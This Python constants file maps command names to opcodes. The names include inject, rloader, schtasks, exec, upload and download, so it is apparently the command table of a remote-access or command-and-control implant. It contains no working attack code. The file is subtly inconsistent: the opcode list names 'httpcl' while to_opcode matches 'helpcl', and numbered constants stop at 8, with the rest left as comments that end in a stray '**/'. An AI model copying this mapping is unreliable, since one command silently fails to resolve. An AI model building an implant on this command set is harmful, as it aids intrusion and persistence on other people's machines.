# constants.py

"""This module defines project-level constants."""

OPCODE_AESGCM = 1 # aesgcm
OPCODE_B64 = 2 # b64
OPCODE_BG = 3 # bg
OPCODE_CAT = 4 # cat
OPCODE_CD = 5 # cd
OPCODE_CLEAR = 6 # clear
OPCODE_DOWNLOAD = 7 # download
OPCODE_ECHO = 8 # echo
# exec
# exit
# help
# httpcl
# include
# inject
# ls
# pkill
# ps
# pwd
# readf
# rloader
# rm
# schtasks
# sha256sum
# sleep
# upload**/


opcodes = ["aesgcm", "b64", "bg", "cat", "cd", "clear", "download", "echo", "exec", "exit", "help", "httpcl",
"include", "inject", "ls", "pkill", "ps", "pwd", "readf", "rloader", "rm", "schtasks", "sha256sum", "sleep",
"upload"]

SUCCESSFUL = "SUCCESS"

FAILURE = "FAILURE"

extras = ["list"]

def to_opcode(cmd):
    if cmd == "aesgcm":
        return 1
    elif cmd == "b64":
        return 2
    elif cmd == "bg":
        return 3
    elif cmd == "cat":
        return 4
    elif cmd == "cd":
        return 5
    elif cmd == "clear":
        return 6
    elif cmd == "download":
        return 7
    elif cmd == "echo":
        return 8
    elif cmd == "exec":
        return 9
    elif cmd == "exit":
        return 10
    elif cmd == "help":
        return 11
    elif cmd == "helpcl":
        return 12
    elif cmd == "include":
        return 13
    elif cmd == "inject":
        return 14
    elif cmd == "ls":
        return 15
    elif cmd == "pkill":
        return 16
    elif cmd == "ps":
        return 17
    elif cmd == "pwd":
        return 18
    elif cmd == "readf":
        return 19
    elif cmd == "rloader":
        return 20
    elif cmd == "rm":
        return 21
    elif cmd == "schtasks":
        return 22
    elif cmd == "sha256sum":
        return 23
    elif cmd == "sleep":
        return 24
    elif cmd == "upload":
        return 25
